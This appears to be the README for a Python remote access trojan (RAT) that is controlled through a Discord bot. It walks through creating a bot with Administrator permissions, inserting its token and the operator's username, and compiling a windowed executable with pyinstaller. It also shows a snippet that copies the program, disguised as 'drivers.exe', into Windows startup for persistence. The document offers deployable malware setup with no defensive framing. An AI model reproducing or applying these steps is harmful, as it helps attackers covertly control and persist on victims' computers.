# PY-RAT
A simple rat made in python, make sure to read READDME


How to create the bot:

Go to https://discord.com/developers/applications

Press "New application" In the cop corner.

Give it a name, a picture if you like.

Goto the "Bot" Tab and enable all privileged Gateway intents, "Presence intent, Server members intent, message content intent.



After that, go on the  "OAUTH2"
                      ↪️"URL GENERATOR"
                       
After that, on the options "Scopes"
                          ↪️"Bot"
                         
                           "Bot permissions"
                          ↪️"Administator"

Than copy the link generated, paste it in your browser and select your server.



After that, go back onto the bot tab and select "Reset token". Copy the newly generated token, scroll all the way down on the python script and paste it in where it says

# Enter your token here
bot.run('')








After that, go up to line "473" where it tells you to put in your username and put it in:

 @bot.command()
async def shutdown(ctx):
    # Replace 'your_username' with your actual username
    if str(ctx.message.author) == 'your_username':  



When you're done, make sure to turn it into a file using "pyinstaller --onefile --windowed your_script_name.py"



NOTE: If you change the name of the file from "drivers.exe/py" it will not put the file into the startup. If you change the name to for example "Ihateapes.exe" you would have
to go up too line 103 and change this:

 def copy_to_startup():
    # Define the name of your executable
    exe_name = "ihateapes.exe"


If you have any trouble using this, make sure to dm me on discord, ma1_art.
